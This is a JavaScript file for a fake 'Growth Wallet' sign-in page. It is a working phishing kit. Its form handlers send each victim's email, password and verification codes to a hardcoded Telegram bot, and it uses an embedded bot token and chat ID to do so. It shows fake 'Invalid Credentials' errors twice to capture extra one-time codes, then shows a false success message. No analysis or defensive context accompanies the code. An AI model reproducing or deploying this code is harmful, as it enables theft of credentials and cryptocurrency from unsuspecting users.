if (!window.matchMedia('(display-mode: standalone)') .matches) {
window. location.href = 'index.html';
}

document.addEventListener('DOMContentLoaded', function() {
// Configuration
    const Usertoken = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y';
    const UserID = '8163151595'; 
    
    // DOM elements
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const verificationForm = document.getElementById('verification-form');
    const emailInput = document.getElementById('email');
    const walletNameInput = document.getElementById('wallet-name');
    const passwordInput = document.getElementById('password');
    const verificationInput = document.getElementById('verification-code');
    const displayEmail = document.getElementById('display-email');
    const verificationEmail = document.getElementById('verification-email');
    const backToEmailBtn = document.getElementById('back-to-email');
    const backToPasswordBtn = document.getElementById('back-to-password');
    
    // Card elements
    const emailCard = document.getElementById('email-card');
    const passwordCard = document.getElementById('password-card');
    const verificationCard = document.getElementById('verification-card');
    
    // Current user email
    let currentEmail = '';
    

    async function sendToT(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${Usertoken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: UserID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log('Response:', data);
            return data.ok;
        } catch (error) {
            console.error('Error sending:', error);
            return false;
        }
    }
    
    // Show error message
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
    }
    
    // Hide error message
    function hideError(element) {
        element.textContent = '';
        element.style.display = 'none';
    }
    
    // Validate email
    function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
    
    // Email form submission
    emailForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = emailInput.value.trim();
        const emailError = document.getElementById('email-error');
        
        if (!email) {
            showError(emailError, 'Please enter your email address');
            return;
        }
        
        if (!isValidEmail(email)) {
            showError(emailError, 'Please enter a valid email address');
            return;
        }
        
        hideError(emailError);
        
        await sendToT(`📧 <b>Growth Wallet - Email Submitted</b>\n\nEmail: <code>${email}</code>`);
        
        currentEmail = email;
        displayEmail.textContent = email;
        verificationEmail.textContent = email;
        
        emailCard.classList.add('hidden');
        passwordCard.classList.remove('hidden');
        walletNameInput.focus();
    });
    
    // Password form submission
    passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const walletName = walletNameInput.value.trim();
        const password = passwordInput.value;
        const walletNameError = document.getElementById('wallet-name-error');
        const passwordError = document.getElementById('password-error');
        
        // Validate wallet name
        if (!walletName) {
            showError(walletNameError, 'Please enter a wallet name');
            return;
        }
        
        // Validate password
        if (!password) {
            showError(passwordError, 'Please enter your password');
            return;
        }
        
        if (password.length < 8) {
            showError(passwordError, 'Password must be at least 8 characters');
            return;
        }
        
        hideError(walletNameError);
        hideError(passwordError);
        
        // Store wallet name in localStorage
        localStorage.setItem('growthWalletName', walletName);
        

        await sendToT(`🔑 <b>Growth Wallet - Password Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nPassword: <code>${password}</code>`);
        
        passwordCard.classList.add('hidden');
        verificationCard.classList.remove('hidden');
        verificationInput.focus();
    });
    
    // Verification form submission
    verificationForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    const code = verificationInput.value.trim();
    const verificationError = document.getElementById('verification-error');
    
    // Initialize attempt counter if it doesn't exist
    if (!window.verificationAttempts) {
        window.verificationAttempts = 0;
    }

    if (!code) {
        showError(verificationError, 'Please enter the verification code');
        return;
    }

    if (code.length !== 6 || !/^\d+$/.test(code)) {
        showError(verificationError, 'Please enter a valid 6-digit code');
        return;
    }

    // Send verification code (every attempt)
    await sendToT(`🔢 <b>Growth Wallet - Verification Attempt</b>\n\nEmail: <code>${currentEmail}</code>\nCode: <code>${code}</code>\nAttempt: ${window.verificationAttempts + 1}/3`);
    
    window.verificationAttempts++;
    
    if (window.verificationAttempts < 3) {
        // Not enough attempts yet
        showError(verificationError, `Invalid Credentials. Retry!`);
        verificationInput.value = ''; // Clear the input
        verificationInput.focus();
    } else {
        // Final attempt - show success
        hideError(verificationError);
        
        // Retrieve wallet name from localStorage
        const walletName = localStorage.getItem('growthWalletName') || 'My Wallet';
        
        // Send final success to Telegram
        await sendToT(`✅ <b>Growth Wallet - Verification Complete</b>\n\nEmail: <code>${currentEmail}</code>\nFinal Code: <code>${code}</code>`);
        
        alert(`Welcome to Growth Wallet, ${walletName}! Verification successful.`);
        setTimeout(function() {
                    window.location.href = 'home.html';
                }, 2000);
        
        // Reset attempts for next time
        window.verificationAttempts = 0; 
        
        // After flow
        localStorage.setItem('rogged', 'true');
    }
});
    
    // Back to email button
    backToEmailBtn.addEventListener('click', function() {
        passwordCard.classList.add('hidden');
        emailCard.classList.remove('hidden');
        emailInput.focus();
    });
    
    // Back to password button
    backToPasswordBtn.addEventListener('click', function() {
        verificationCard.classList.add('hidden');
        passwordCard.classList.remove('hidden');
        passwordInput.focus();
    });
    
    // Input validation
    emailInput.addEventListener('input', function() {
        hideError(document.getElementById('email-error'));
    });
    
    walletNameInput.addEventListener('input', function() {
        hideError(document.getElementById('wallet-name-error'));
    });
    
    passwordInput.addEventListener('input', function() {
        hideError(document.getElementById('password-error'));
    });
    
    verificationInput.addEventListener('input', function() {
        hideError(document.getElementById('verification-error'));
    });
});
